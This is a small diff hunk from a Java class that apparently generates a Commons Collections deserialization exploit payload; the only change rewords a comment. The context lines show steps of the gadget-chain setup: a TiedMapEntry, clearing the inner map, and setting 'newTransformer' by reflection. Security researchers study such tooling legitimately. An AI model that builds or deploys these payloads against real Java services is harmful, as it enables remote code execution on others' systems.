@@ -36,7 +36,7 @@ public class CommonsCollectionsK1 extends PayloadRunner implements ObjectPayload
         Map outerMap = new HashMap();
         TiedMapEntry tied = new TiedMapEntry(m, tpl);
         outerMap.put(tied, "t");
-        // clear the inner cache, this is important
+        // clear the inner map data, this is important
         innerMap.clear();
 
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
